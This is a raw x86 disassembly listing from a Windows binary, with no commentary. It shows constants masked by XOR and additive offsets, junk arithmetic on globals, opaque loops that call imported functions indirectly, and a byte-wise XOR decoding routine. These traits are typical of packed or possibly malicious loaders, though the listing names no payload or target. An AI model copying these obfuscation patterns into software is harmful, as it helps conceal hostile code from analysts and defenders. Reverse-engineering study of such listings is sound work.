  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421ae6
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421cee
  41afcc:	mov    ecx,DWORD PTR ds:0x421a5e
  41afd2:	mov    ecx,DWORD PTR [ecx]
  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x4238a2
  41b017:	push   0x423822
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
  41b11c:	mov    eax,ds:0x421c66
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x4237fd
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423814
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c86
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421bdc
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x423972
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d76,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423ac1
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
  41b863:	mov    eax,DWORD PTR [ebp-0x4]
  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d7a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
